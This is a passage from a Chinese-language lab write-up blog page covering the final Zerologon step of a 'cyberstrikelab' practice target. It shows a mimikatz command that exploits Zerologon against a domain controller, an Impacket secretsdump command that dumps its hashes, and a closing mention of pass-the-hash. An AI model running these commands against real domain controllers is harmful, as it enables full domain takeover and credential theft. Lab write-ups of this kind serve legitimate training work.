+<h2 id="zerologon"><a href="#zerologon" class="headerlink" title="zerologon"></a>zerologon</h2><img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531112925985.png" class="">
+
+<p>滞空密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc.cyberstrikelab.com /ntlm /null /account:dc$ /exploit</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531113038385.png" class="">
+
+<p>直接用secretdump出hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python secretsdump.py cyberstrikelab.com/DC\$@10.0.0.5 -no-pass</span><br></pre></td></tr></table></figure>
+
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531113712458.png" class="">
+
+<p>最后打一个pth</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%9D%E5%9B%BDcms-%E5%90%8E%E5%8F%B0rce"><span class="toc-number">2.</span> <span class="toc-text">帝国cms 后台rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-CVE-2018-14399"><span class="toc-number">4.</span> <span class="toc-text">phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zerologon"><span class="toc-number">6.</span> <span class="toc-text">zerologon</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&text=cyberstrikelab-TengSnake"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&is_video=false&description=cyberstrikelab-TengSnake"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-TengSnake&body=Check out this article: https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&name=cyberstrikelab-TengSnake&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&t=cyberstrikelab-TengSnake"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
